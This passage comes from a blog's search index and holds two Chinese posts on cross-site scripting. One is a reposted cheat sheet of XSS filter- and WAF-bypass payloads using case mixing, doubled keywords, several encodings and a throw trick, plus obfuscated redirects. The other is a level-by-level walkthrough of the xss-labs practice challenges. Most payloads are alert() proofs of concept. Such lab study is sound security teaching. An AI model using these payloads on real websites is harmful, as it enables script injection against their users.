style=&quot;color:rgb(&#39;&#39;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7以下</code></pre><p>background属性</p><pre><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</code></pre><h3 id="存在过滤情况"><a href="#存在过滤情况" class="headerlink" title="存在过滤情况"></a>存在过滤情况</h3><p>过滤空格</p><pre><code>用 / 代替空格&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</code></pre><p>过滤关键字</p><pre><code>大小写绕过&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;字符拼接(利用eval)&lt;img src=&quot;x&quot; onerror=&quot;a=aler;b=t;c=&#39;(xss);&#39;;eval(a+b+c)&quot;&gt;字符拼接(利用top)&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](``xss``);&lt;/script&gt;(只有两个``这里是为了凸显出有`符号)</code></pre><p>其他字符混淆</p><pre><code>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了下面举几个简单的例子可利用注释、标签的优先级等&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;&lt;scri&lt;!--test--&gt;pt&gt;alert(&quot;hello world!&quot;)&lt;/scri&lt;!--test--&gt;pt&gt;&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(``xss``);&quot;&gt; 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;</code></pre><p>编码绕过</p><pre><code>Unicode编码绕过&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;url编码绕过&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#39;))&quot;&gt;&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;Ascii码绕过&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;Hex绕过&lt;img src=x onerror=eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&gt;八进制绕过&lt;img src=x onerror=alert(&#39;\170\163\163&#39;)&gt;base64绕过&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#39;))&quot;&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre><p>过滤双引号，单引号</p><pre><code>如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号&lt;img src=&quot;x&quot; onerror=alert(``xss``);&gt;使用编码绕过，具体看上面列举的例子</code></pre><p>过滤括号</p><pre><code>当括号被过滤的时候可以使用throw来绕过&lt;svg/onload=&quot;window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&quot;&gt;</code></pre><p>过滤url地址</p><pre><code>使用url编码&lt;img src=&quot;x&quot; onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``&gt;使用IP&lt;img src=&quot;x&quot; onerror=document.location=``http://2130706433/``&gt;十进制&lt;img src=&quot;x&quot; onerror=document.location=``http://0177.0.0.01/``&gt;八进制&lt;img src=&quot;x&quot; onerror=document.location=``http://0x7f.0x0.0x0.0x1/``&gt;十六进制&lt;img src=&quot;x&quot; onerror=document.location=``//www.baidu.com``&gt;html标签中用//可以代替http://使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)使用中文逗号代替英文逗号&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www.baidu.com``&quot;&gt;//会自动跳转到百度</code></pre><p>原文链接：<a href="https://blog.csdn.net/LYJ20010728/article/details/116462782">https://blog.csdn.net/LYJ20010728/article/details/116462782</a></p><p>拓展链接：<a href="https://blog.csdn.net/hackzkaq/article/details/126344040">https://blog.csdn.net/hackzkaq/article/details/126344040</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xsslabs</title>
      <link href="/2023/03/28/xsslabs/"/>
      <url>/2023/03/28/xsslabs/</url>
      
        <content type="html"><![CDATA[<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>考察反射型xss</p><pre><code class="javascript">&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>先用第一关的payload注入发现没有用，查看网页源码</p><img src="/2023/03/28/xsslabs/172420.png" class=""><p>发现&lt;,&gt;,”都被编码了，猜测在服务器端用htmlspecialchars()函数对keyword参数的值进行了处理。接着往下看可以看到插入到value参数值中的恶意代码并没有被编码而是直接原样返回，要想浏览器执行这里的弹窗代码，只需要将属性的引号和标签先闭合就可以了。将keyword的参数值重新赋值 </p><pre><code class="javascript">&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><p>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。<br>预定义的字符是：<br>&amp; （和号）成为 &amp; amp;<br>“ （双引号）成为 &amp; quot;<br>‘ （单引号）成为 ‘<br>&lt; （小于）成为 &amp; lt;<br>&gt; （大于）成为 &amp; gt;</p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>我们可以用第二关的payload试发现没有用，查看网页源码发现value参数值也被编码了，这里可以通过&lt;input&gt;标签的一些特殊事件来执行js代码，构造代码：</p><pre><code class="javascript">level3.php?keyword=&#39;onfocus=javascript:alert(&#39;xss&#39;) &gt; //&amp;submit=搜索</code></pre><p>发现没有直接弹窗，这是因为onfocus事件的特殊性造成的最简单的实例就是网页上的一个输入框,当使用鼠标点击该输入框时输入框被选中可以输入内容的时候就是该输入框获得焦点的时候,此时输入框就会触发onfocus事件.因此点击当前页面的输入框就可以完成弹框了。</p><p>onfocus 事件在对象获得焦点时发生。</p><p>onfocus 通常用于 &lt;input&gt;, &lt;select&gt;, 和&lt;a&gt;.</p><p>提示： onfocus 事件的相反事件为 onblur 事件。</p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>这一关在value处直接把&gt;和&lt;过滤了，但我们仍然可以用onfocus事件</p><pre><code class="javascript">&quot; onfocus=javascript:alert(&#39;xss&#39;) &quot;</code></pre><p>注：这里需要用双引号闭合源代码后面的双引号，并且注意语句之间的空格</p><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>我们先看源代码</p><img src="/2023/03/28/xsslabs/200701.png" class=""><p>可以看到，这里对script和onfocus字符都进行了变形，并且将所有字符转换成了小写，所以没法通过大小写绕过，这里我们使用a href标签法。</p><p>href属性的意思是 当标签&lt;a&gt;被点击的时候，就会触发执行转跳，一般用于转跳到一个网站，我们还可以触发执行一段js代码</p><pre><code class="javascript">&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt;</code></pre><p>之后点击xxx，触发a标签href属性即可。</p><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>这一关过滤了很多，但可以用大小写混合绕过</p><pre><code class="javascript">&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt;</code></pre><p>常见的绕过姿势可以看我转载的《xss常见的触发标签》这篇总结</p><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>先上前面用过的payload，看源代码反馈</p><img src="/2023/03/28/xsslabs/212743.png" class=""><p>可以看到，这里面进行了小写转化，将检测出来的on，script，href给删掉了，我们试试双拼绕过</p><pre><code>&quot;&gt; &lt;a hrehreff=javasscriptcript:alert()&gt;xxx&lt;/a&gt;</code></pre><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>这关把前面能用的都过滤了，还把双引号也给实体化了</p><p>这里我们需要利用href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议</p><pre><code>javascript:alert()</code></pre><p>利用在线工具进行Unicode编码后得到,</p><pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;</code></pre><p>提交之后插入到了href里面</p><img src="/2023/03/28/xsslabs/220233.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
